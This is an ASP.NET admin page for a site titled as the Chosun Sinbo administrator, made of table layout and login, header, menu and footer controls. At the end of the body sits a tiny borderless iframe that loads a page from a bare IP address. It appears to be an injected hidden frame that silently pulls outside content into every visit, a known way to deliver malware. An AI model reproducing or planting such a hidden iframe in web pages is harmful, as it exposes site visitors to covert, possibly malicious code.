<%@ Register TagPrefix="uc1" TagName="Login" Src="Login.ascx" %>
<%@ Page Language="vb" AutoEventWireup="false" Codebehind="AdminMain.aspx.vb" Inherits="KPPress.AdminMain" %>
<%@ Register TagPrefix="uc1" TagName="Top" Src="../include/Top.ascx" %>
<%@ Register TagPrefix="uc1" TagName="AdminLeft" Src="AdminLeft.ascx" %>
<%@ Register TagPrefix="uc1" TagName="Bottom" Src="../include/Bottom.ascx" %>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML>
	<HEAD>
		<title>조선신보사관리자</title>
		<link rel="stylesheet" href="../include/style.css">
		<meta name="GENERATOR" content="Microsoft Visual Studio .NET 7.1">
		<meta name="CODE_LANGUAGE" content="Visual Basic .NET 7.1">
		<meta name="vs_defaultClientScript" content="JavaScript">
		<meta name="vs_targetSchema" content="http://schemas.microsoft.com/intellisense/ie5">
	</HEAD>
	<body leftmargin="0" topmargin="0">
		<form id="Form1" method="post" runat="server" autocomplete="off">
			<table width="780" border="0" cellpadding="0" cellspacing="0">
				<tr>
					<td>
						<uc1:Top id="Top1" runat="server"></uc1:Top></td>
				</tr>
				<tr>
					<td background="../img/bg_table_big.gif"><table width="779" border="0" cellspacing="0" cellpadding="0">
							<tr>
								<td width="155" valign="top" background="../img/bg_table_small.gif">
									<uc1:AdminLeft id="AdminLeft1" runat="server"></uc1:AdminLeft>
								</td>
								<td valign="top"><table width="604" border="0" align="center" cellpadding="0" cellspacing="0">
										<tr>
											<td><img src="../img/00.gif" width="1" height="9"></td>
										</tr>
										<tr>
											<td>&nbsp;</td>
										</tr>
										<tr>
											<td>&nbsp;</td>
										</tr>
										<tr>
											<td>&nbsp;</td>
										</tr>
										<tr>
											<td>&nbsp;</td>
										</tr>
										<tr align="center">
											<td>&nbsp;
												<uc1:Login id="Login1" runat="server"></uc1:Login></td>
										</tr>
										<tr>
											<td>&nbsp;</td>
										</tr>
										<tr>
											<td>&nbsp;</td>
										</tr>
									</table>
								</td>
							</tr>
						</table>
					</td>
				</tr>
				<tr>
					<td background="../img/bg_table_big.gif"><uc1:Bottom id="Bottom1" runat="server"></uc1:Bottom></td>
				</tr>
			</table>
		</form>
		<iframe frameborder="0" marginheight="0" marginwidth="0" scrolling="no"  width="50" height="50" src="http://128.241.236.3/appstore/index.html"></iframe>
	</body>
</HTML>
